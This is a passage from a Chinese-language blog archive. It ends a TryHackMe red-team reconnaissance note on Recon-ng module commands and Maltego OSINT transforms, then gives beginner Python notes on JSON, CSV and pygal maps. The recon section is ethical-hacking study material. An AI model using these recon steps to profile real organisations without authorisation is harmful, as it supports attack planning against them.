来卸载指定的模块<br>模块按多个类别分组，例如发现（discovery）、导入（import）、侦察（recon）和报告（reporting）。此外，侦察（recon）还根据转换类型分为多个子类别。运行 marketplace search 来获取所有可用模块的列表。<br>终端中，搜索包含 domains- 的模块。執行marketplace search domains-<br><img src="/photo/Red_Team_Recon/26.jpg" alt="26"><br>選擇想要的模塊<br>假设你对 recon&#x2F;domains-hosts&#x2F;google_site_web 感兴趣。要了解任何特定模块的更多信息，你可以使用命令 marketplace info MODULE；这是一个基本命令，解释了模块的功能。例如，marketplace info google_site_web 提供以下描述：“通过使用 Google.com 的 ‘site’ 搜索操作符来收集主机。将结果更新到 ‘hosts’ 表中。”换句话说，这个模块将使用 Google 搜索引擎和 “site” 操作符。</p></blockquote></li><li><p>Working with Installed Modules</p><blockquote><p>使用命令 marketplace install MODULE 来安装我们想要的模块，例如，marketplace install google_site_web。<br>modules search 来获取所有已安装模块的列表。<br>modules load MODULE 来将特定模块加载到内存中<br>让我们加载我们之前从市场安装的模块，使用 modules load viewdns_reverse_whois。要运行它，我们需要设置所需的选项。<br>options list 来列出我们可以为加载的模块设置的选项。<br>options set &lt;option&gt; &lt;value&gt; 来设置选项的值。<br><img src="/photo/Red_Team_Recon/27.jpg" alt="27"></p></blockquote></li><li><p>run</p><blockquote><p><img src="/photo/Red_Team_Recon/28.jpg" alt="28"></p></blockquote></li></ul><h4 id="補充"><a href="#補充" class="headerlink" title="補充"></a>補充</h4><blockquote><p>如果沒有對應服務API的金鑰，某些模組將無法使用。K表示您需要提供相關的服務金鑰才能使用該模組。</p></blockquote><ul><li><p>keys list列出鍵</p></li><li><p>keys add KEY_NAME KEY_VALUE新增一個鍵</p></li><li><p>keys remove KEY_NAME刪除一個鍵</p><blockquote><p>一旦安裝了這組模組，您就可以繼續載入並執行它們。</p></blockquote></li><li><p>modules load MODULE載入已安裝的模組</p></li><li><p>CTRL + C卸載模組。</p></li><li><p>info查看已載入模組的資訊。</p></li><li><p>options list列出所選模組的可用選項。</p></li><li><p>options set NAME VALUE</p></li><li><p>run執行載入的模組。</p></li></ul><h3 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h3><h4 id="簡介-12"><a href="#簡介-12" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>Maltego 是一款将思维导图与开源情报（OSINT）结合的应用程序。通常，你会从一个域名、公司名称、个人姓名、电子邮件地址等开始。然后，你可以让这些信息通过各种转换（transforms）进行处理。<br>非常重要的一点是，Maltego 中的一些转换可能会主动连接到目标系统。因此，如果你想限制自己只进行被动侦察，最好在使用转换之前了解其工作原理。</p></blockquote><h4 id="示範-12"><a href="#示範-12" class="headerlink" title="示範"></a>示範</h4><p><img src="/photo/Red_Team_Recon/29.jpg" alt="29"></p><h4 id="小試身手"><a href="#小試身手" class="headerlink" title="小試身手"></a>小試身手</h4><p><img src="/photo/Red_Team_Recon/30.jpg" alt="30"></p>]]></content>
      
      
      <categories>
          
          <category> 紅隊偵查 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 紅隊 </tag>
            
            <tag> 筆記 </tag>
            
            <tag> tryhackme </tag>
            
            <tag> 道德黑客 </tag>
            
            <tag> 自學 </tag>
            
            <tag> 攻擊階段-偵查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬蟲(第一章,第二章)</title>
      <link href="/2024/02/06/python%E7%88%AC%E8%9F%B2-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
      <url>/2024/02/06/python%E7%88%AC%E8%9F%B2-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%AC%AC%E4%BA%8C%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="python網路爬蟲-一、二"><a href="#python網路爬蟲-一、二" class="headerlink" title="python網路爬蟲(一、二)"></a>python網路爬蟲(一、二)</h1><h2 id="資料格式"><a href="#資料格式" class="headerlink" title="資料格式"></a><strong>資料格式</strong></h2><h3 id="python-json格式"><a href="#python-json格式" class="headerlink" title="python-&gt;json格式"></a><strong>python-&gt;json格式</strong></h3><h4 id="dumps"><a href="#dumps" class="headerlink" title="dumps()"></a><strong>dumps()</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">list1=[1,2,3,4,5]</span><br><span class="line">tuple1=(6,7,8,9,10)</span><br><span class="line">dict1=&#123;&quot;aaaa&quot;:123&#125;</span><br><span class="line">str1=&quot;123456&quot;</span><br><span class="line">a=1</span><br><span class="line">b=1.2</span><br><span class="line">c=1456789876567898765567876222222222222222222222222222222</span><br><span class="line">T=True</span><br><span class="line">F=False</span><br><span class="line">d=None</span><br><span class="line">print(json.dumps(list1))</span><br><span class="line">print(json.dumps(tuple1))</span><br><span class="line">print(json.dumps(str1))</span><br><span class="line">print(json.dumps(dict1))</span><br><span class="line">print(json.dumps(a))</span><br><span class="line">print(json.dumps(b))</span><br><span class="line">print(json.dumps(c))</span><br><span class="line">print(json.dumps(T))</span><br><span class="line">print(json.dumps(d))</span><br><span class="line">print(json.dumps(F))</span><br></pre></td></tr></table></figure><h4 id="python-json格式-1"><a href="#python-json格式-1" class="headerlink" title="python-&gt;json格式"></a><strong>python-&gt;json格式</strong></h4><table><thead><tr><th>python資料</th><th>JSON資料</th></tr></thead><tbody><tr><td>dict</td><td>object</td></tr><tr><td>list,tuple</td><td>array</td></tr><tr><td>str,unicode</td><td>string</td></tr><tr><td>int,float,long</td><td>nuumber</td></tr><tr><td>True</td><td>true</td></tr><tr><td>False</td><td>false</td></tr><tr><td>None</td><td>null</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">obj1=[&#123;&#x27;name&#x27;:&#x27;ray&#x27;,&#x27;Age&#x27;:20,&#x27;size&#x27;:&#x27;L&#x27;&#125;]</span><br><span class="line">jobj1=json.dumps(obj1)</span><br><span class="line">print(obj1)</span><br><span class="line">print(jobj1)</span><br></pre></td></tr></table></figure><blockquote><p><strong>note:</strong></p><ol><li>json字串是用雙引號</li></ol></blockquote><h4 id="dumps-的sort-key參數"><a href="#dumps-的sort-key參數" class="headerlink" title="dumps()的sort_key參數"></a><strong>dumps()的sort_key參數</strong></h4><blockquote><p>轉成json時，鍵排序</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">obj1=[&#123;&#x27;a&#x27;:1,&#x27;c&#x27;:2,&#x27;d&#x27;:3,&#x27;b&#x27;:4&#125;]</span><br><span class="line">jobj1=json.dumps(obj1)</span><br><span class="line">jobj1_sort=json.dumps(obj1,sort_keys=True)</span><br><span class="line">print(jobj1)</span><br><span class="line">print(jobj1_sort)</span><br></pre></td></tr></table></figure><h4 id="dumps-的indent參數"><a href="#dumps-的indent參數" class="headerlink" title="dumps()的indent參數"></a><strong>dumps()的indent參數</strong></h4><blockquote><p>轉成json時，設定縮排使其容易閱讀</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">obj1=[&#123;&#x27;a&#x27;:1,&#x27;c&#x27;:2,&#x27;d&#x27;:3,&#x27;b&#x27;:4&#125;]</span><br><span class="line">jobj1_indent=json.dumps(obj1,indent=True)</span><br><span class="line">print(jobj1_indent)</span><br></pre></td></tr></table></figure><h3 id="json-python格式"><a href="#json-python格式" class="headerlink" title="json-&gt;python格式"></a><strong>json-&gt;python格式</strong></h3><h4 id="loads"><a href="#loads" class="headerlink" title="loads()"></a><strong>loads()</strong></h4><table><thead><tr><th>JSON資料</th><th>python資料</th></tr></thead><tbody><tr><td>object</td><td>dict</td></tr><tr><td>array</td><td>list</td></tr><tr><td>string</td><td>unicode</td></tr><tr><td>nuumber(int)</td><td>int,long</td></tr><tr><td>nuumber(real)</td><td>float</td></tr><tr><td>true</td><td>True</td></tr><tr><td>false</td><td>False</td></tr><tr><td>null</td><td>None</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">jobj1=&#x27;&#123;&quot;a&quot;:1,&quot;c&quot;:2,&quot;d&quot;:3,&quot;b&quot;:4&#125;&#x27;</span><br><span class="line">obj1=json.loads(jobj1)</span><br><span class="line">print(obj1)</span><br><span class="line">print(type(obj1))</span><br></pre></td></tr></table></figure><h4 id="每個JSON文件只能放一個JSON物件，要放多個物件，可用一個父JSON包含"><a href="#每個JSON文件只能放一個JSON物件，要放多個物件，可用一個父JSON包含" class="headerlink" title="每個JSON文件只能放一個JSON物件，要放多個物件，可用一個父JSON包含"></a><strong>每個JSON文件只能放一個JSON物件，要放多個物件，可用一個父JSON包含</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">jobj1=&#x27;&#123;&quot;A&quot;:[&#123;&quot;a&quot;:1&#125;,&#123;&quot;b&quot;:2&#125;]&#125;&#x27;</span><br><span class="line">obj1=json.loads(jobj1)</span><br><span class="line">print(obj1)</span><br><span class="line">print(obj1[&quot;A&quot;])</span><br><span class="line">print(obj1[&quot;A&quot;][1])</span><br><span class="line">print(obj1[&quot;A&quot;][1][&quot;b&quot;])</span><br></pre></td></tr></table></figure><h4 id="將字典寫入json"><a href="#將字典寫入json" class="headerlink" title="將字典寫入json"></a><strong>將字典寫入json</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">dict1=&#123;&#x27;a&#x27;:1,&#x27;c&#x27;:2,&#x27;d&#x27;:3,&#x27;b&#x27;:4&#125;</span><br><span class="line">fn=&quot;將字典寫入json檔.json&quot;</span><br><span class="line">with open(fn,&#x27;w&#x27;) as f:</span><br><span class="line">    json.dump(dict1,f,sort_keys=True,indent=True)</span><br></pre></td></tr></table></figure><blockquote><p>寫入中文時，encoding&#x3D;’utf-8’，且indent&#x3D;2, ensure_ascii&#x3D;False</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">objlist = [&#123;&quot;日本&quot;:&quot;Japan&quot;, &quot;首都&quot;:&quot;Tykyo&quot;&#125;,</span><br><span class="line">           &#123;&quot;美州&quot;:&quot;USA&quot;, &quot;首都&quot;:&quot;Washington&quot;&#125;]</span><br><span class="line"></span><br><span class="line">fn = &#x27;out1_9_2.json&#x27;</span><br><span class="line">with open(fn, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as fnObj:</span><br><span class="line">    json.dump(objlist, fnObj, indent=2, ensure_ascii=False)</span><br></pre></td></tr></table></figure><h4 id="讀取json檔案"><a href="#讀取json檔案" class="headerlink" title="讀取json檔案"></a><strong>讀取json檔案</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">      </span><br><span class="line">fn = &#x27;out1_9.json&#x27;</span><br><span class="line">with open(fn, &#x27;r&#x27;) as fnObj:</span><br><span class="line">    data = json.load(fnObj)</span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line">print(type(data))</span><br></pre></td></tr></table></figure><h4 id="應用"><a href="#應用" class="headerlink" title="應用"></a><strong>應用</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">fn=&#x27;login.json&#x27;</span><br><span class="line">user=input(&quot;輸入使用者名稱 : &quot;)</span><br><span class="line">with open(fn,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">    json.dump(user,file,ensure_ascii=False)</span><br><span class="line">    print(&quot;%s 歡迎使用本系統。&quot;%user)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">fn=&#x27;login.json&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">    login=json.load(file)</span><br><span class="line">    print(&quot;%s 歡迎回來&quot; %login)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">fn=&#x27;login_ch1_13_2.json&#x27;</span><br><span class="line">try:</span><br><span class="line">    with open(fn,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">        login=json.load(file)</span><br><span class="line">        loginu=input(&quot;請輸入帳號 : &quot;)</span><br><span class="line">except Exception:</span><br><span class="line">    with open(fn,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">        login=input(&quot;新增帳號 : &quot;)</span><br><span class="line">        json.dump(login,file,ensure_ascii=False)</span><br><span class="line">        print(&quot;帳號已新增&quot;)</span><br><span class="line">else:</span><br><span class="line">    if loginu==login:</span><br><span class="line">        print(&quot;%s 歡迎回來&quot;%login)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;使用者名稱錯誤&quot;)</span><br></pre></td></tr></table></figure><h4 id="應用-建立世界地圖"><a href="#應用-建立世界地圖" class="headerlink" title="應用(建立世界地圖)"></a><strong>應用(建立世界地圖)</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import pygal.maps.world</span><br><span class="line">worldmap=pygal.maps.world.World()</span><br><span class="line">worldmap.title=&#x27;world map&#x27;</span><br><span class="line">worldmap.add(&#x27;Asia&#x27;,[&#x27;jp&#x27;,&#x27;cn&#x27;,&#x27;tw&#x27;])</span><br><span class="line">worldmap.render_to_file(&#x27;out1_18_2.svg&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import pygal.maps.world</span><br><span class="line">from pygal.maps.world import COUNTRIES</span><br><span class="line">fn=&#x27;populations.json&#x27;</span><br><span class="line">def getcode(CountryName):</span><br><span class="line">    for a,b in COUNTRIES.items():</span><br><span class="line">        if b==CountryName:</span><br><span class="line">            return a</span><br><span class="line">    return None</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    datas=json.load(file)</span><br><span class="line">dict1=&#123;&#125;</span><br><span class="line">for data in datas:</span><br><span class="line">    if data[&#x27;Year&#x27;]==&#x27;2010&#x27;:</span><br><span class="line">        CountryName=data[&#x27;Country Name&#x27;]</span><br><span class="line">        Year=data[&#x27;Year&#x27;]</span><br><span class="line">        n=int(float(data[&#x27;Numbers&#x27;]))</span><br><span class="line">        wcode=getcode(CountryName)</span><br><span class="line">        if wcode!=None:</span><br><span class="line">            dict1[wcode]=n</span><br><span class="line"></span><br><span class="line">worldmap=pygal.maps.world.World()</span><br><span class="line">worldmap.title=&#x27;2010人口分布&#x27;</span><br><span class="line">worldmap.add(&#x27;2010&#x27;,dict1)</span><br><span class="line">worldmap.render_to_file(&#x27;out1_21_2.svg&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import pygal.maps.world</span><br><span class="line">from pygal.maps.world import COUNTRIES</span><br><span class="line">fn=&#x27;populations.json&#x27;</span><br><span class="line">def getcode(a):</span><br><span class="line">    for x,y in COUNTRIES.items():</span><br><span class="line">        if y==a:</span><br><span class="line">            return x</span><br><span class="line">    return None</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    datas=json.load(file)</span><br><span class="line">dict1=&#123;&#125;</span><br><span class="line">dict2=&#123;&#125;</span><br><span class="line">for data in datas:</span><br><span class="line">    if data[&#x27;Year&#x27;]==&#x27;2010&#x27;:</span><br><span class="line">        a=data[&#x27;Country Name&#x27;]</span><br><span class="line">        b=int(float(data[&#x27;Numbers&#x27;]))</span><br><span class="line">        c=getcode(a)</span><br><span class="line">        if c!=None:</span><br><span class="line">            if b&gt;=100000000:</span><br><span class="line">                dict1[c]=b</span><br><span class="line">            else:</span><br><span class="line">                dict2[c]=b</span><br><span class="line"></span><br><span class="line">worldmap=pygal.maps.world.World()</span><br><span class="line">worldmap.title=&#x27;2010&#x27;</span><br><span class="line">worldmap.add(&#x27;&gt;=100000000&#x27;,dict1)</span><br><span class="line">worldmap.add(&#x27;&lt;100000000&#x27;,dict2)</span><br><span class="line">worldmap.render_to_file(&#x27;out1_22_2.svg&#x27;)</span><br></pre></td></tr></table></figure><h3 id="csv"><a href="#csv" class="headerlink" title="csv"></a><strong>csv</strong></h3><h4 id="檔案開啟-reader"><a href="#檔案開啟-reader" class="headerlink" title="檔案開啟(reader())"></a>檔案開啟(reader())</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;csvReport.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    datas=csv.reader(file)#指定跌代對象</span><br><span class="line">    pdata=list(datas)</span><br><span class="line">print(datas)</span><br><span class="line">print(pdata)</span><br></pre></td></tr></table></figure><blockquote><p>或者用for迴圈列印</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;csvReport.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    p=csv.reader(file)</span><br><span class="line">    for data in p:</span><br><span class="line">        print(data)</span><br></pre></td></tr></table></figure><blockquote><p>或者用for列印串列內容</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;csvReport.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    p=csv.reader(file)</span><br><span class="line">    datas=list(p)</span><br><span class="line">for data in datas:</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure><blockquote><p>使用串列索引讀取csv</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;csvReport.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    p=csv.reader(file)</span><br><span class="line">    datas=list(p)</span><br><span class="line">print(datas[0][0],datas[0][1])</span><br><span class="line">print(datas[1][0],datas[1][1])</span><br><span class="line">print(datas[3][0],datas[3][1])</span><br></pre></td></tr></table></figure><h4 id="檔案開啟-dictreader"><a href="#檔案開啟-dictreader" class="headerlink" title="檔案開啟(dictreader())"></a>檔案開啟(dictreader())</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;csvPeople.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    dict1=csv.DictReader(file)</span><br><span class="line">    for data in dict1:</span><br><span class="line">        print(data)</span><br></pre></td></tr></table></figure><blockquote><p>將檔案中的file name與last name印出來</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;csvPeople.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    p=csv.DictReader(file)</span><br><span class="line">    print(p)</span><br><span class="line">    for data in p:</span><br><span class="line">        print(data[&#x27;first_name&#x27;],data[&#x27;last_name&#x27;])</span><br></pre></td></tr></table></figure><h4 id="寫入csv檔-writer"><a href="#寫入csv檔-writer" class="headerlink" title="寫入csv檔(writer)"></a>寫入csv檔(writer)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_7_2.csv&#x27;</span><br><span class="line">with open(fn,&#x27;w&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">    writefile=csv.writer(file)</span><br><span class="line">    writefile.writerow([&#x27;name&#x27;,&#x27;age&#x27;,&#x27;high&#x27;])</span><br><span class="line">    writefile.writerow([&#x27;a&#x27;,&#x27;14&#x27;,&#x27;100&#x27;])</span><br><span class="line">    writefile.writerow([&#x27;b&#x27;,&#x27;18&#x27;,&#x27;200&#x27;])</span><br><span class="line">    writefile.writerow([&#x27;c&#x27;,&#x27;16&#x27;,&#x27;150&#x27;])</span><br></pre></td></tr></table></figure><h4 id="複製csv檔"><a href="#複製csv檔" class="headerlink" title="複製csv檔"></a>複製csv檔</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">rn=input(&#x27;複製檔案名:&#x27;)</span><br><span class="line">wn=input(&#x27;輸出檔案名:&#x27;)</span><br><span class="line">try:</span><br><span class="line">    with open(rn,&#x27;r&#x27;) as file:</span><br><span class="line">        p=csv.reader(file)</span><br><span class="line">        datas=list(p)</span><br><span class="line">except:</span><br><span class="line">    print(&quot;未找到複製的檔案&quot;)</span><br><span class="line">else:</span><br><span class="line">    with open(wn,&#x27;w&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">        writefile=csv.writer(file)</span><br><span class="line">        for data in datas:</span><br><span class="line">            writefile.writerow(data)</span><br></pre></td></tr></table></figure><h4 id="delimiter改變csv的分隔符號"><a href="#delimiter改變csv的分隔符號" class="headerlink" title="delimiter改變csv的分隔符號"></a>delimiter改變csv的分隔符號</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_9_2.csv&#x27;</span><br><span class="line">with open(fn,&#x27;w&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">    writefile=csv.writer(file,delimiter=&#x27;\t&#x27;)</span><br><span class="line">    writefile.writerow([&#x27;name&#x27;,&#x27;age&#x27;,&#x27;high&#x27;])</span><br><span class="line">    writefile.writerow([&#x27;a&#x27;,&#x27;14&#x27;,&#x27;100&#x27;])</span><br><span class="line">    writefile.writerow([&#x27;b&#x27;,&#x27;18&#x27;,&#x27;200&#x27;])</span><br><span class="line">    writefile.writerow([&#x27;c&#x27;,&#x27;16&#x27;,&#x27;200&#x27;])</span><br></pre></td></tr></table></figure><h4 id="寫入csv檔-dictwrite"><a href="#寫入csv檔-dictwrite" class="headerlink" title="寫入csv檔(dictwrite)"></a>寫入csv檔(dictwrite)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_10_2.csv&#x27;</span><br><span class="line">list1=[&#x27;name&#x27;,&#x27;age&#x27;,&#x27;high&#x27;]</span><br><span class="line">with open(fn,&#x27;w&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">    writefile=csv.DictWriter(file,fieldnames=list1)</span><br><span class="line">    writefile.writeheader()</span><br><span class="line">    writefile.writerow(&#123;&#x27;name&#x27;:&#x27;a&#x27;,&#x27;age&#x27;:&#x27;18&#x27;,&#x27;high&#x27;:&#x27;100&#x27;&#125;)</span><br><span class="line">    writefile.writerow(&#123;&#x27;name&#x27;:&#x27;b&#x27;,&#x27;age&#x27;:&#x27;14&#x27;,&#x27;high&#x27;:&#x27;200&#x27;&#125;)</span><br><span class="line">    writefile.writerow(&#123;&#x27;name&#x27;:&#x27;c&#x27;,&#x27;age&#x27;:&#x27;16&#x27;,&#x27;high&#x27;:&#x27;150&#x27;&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>或用for輸入串列資料</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_11_3.csv&#x27;</span><br><span 